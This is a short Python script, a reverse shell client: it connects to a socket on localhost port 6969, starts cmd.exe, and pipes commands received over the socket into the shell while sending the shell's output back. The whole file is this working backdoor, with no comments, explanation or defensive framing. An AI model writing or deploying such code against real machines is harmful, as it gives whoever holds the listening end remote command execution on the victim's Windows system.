import socket
import os
from threading import Thread
from subprocess import Popen, PIPE, STDOUT

Client = socket.socket()
Client.connect(('localhost', 6969))


class Shell:
    def __init__(self):
        self.p = Popen(['cmd.exe'], stdin=PIPE, stdout=PIPE, stderr=STDOUT)
        self.on = True
        Thread(target=self.snd, daemon=True).start()
        Thread(target=self.rcv).start()

    def rcv(self):
        while self.on:
            i = Client.recv(1024)
            if i.decode() == "exit":
                self.on = False
            else:
                os.write(self.p.stdin.fileno(), i + b'\n')

    def snd(self):
        while self.on:
            o = os.read(self.p.stdout.fileno(), 1024)
            Client.send(o)


Shell()
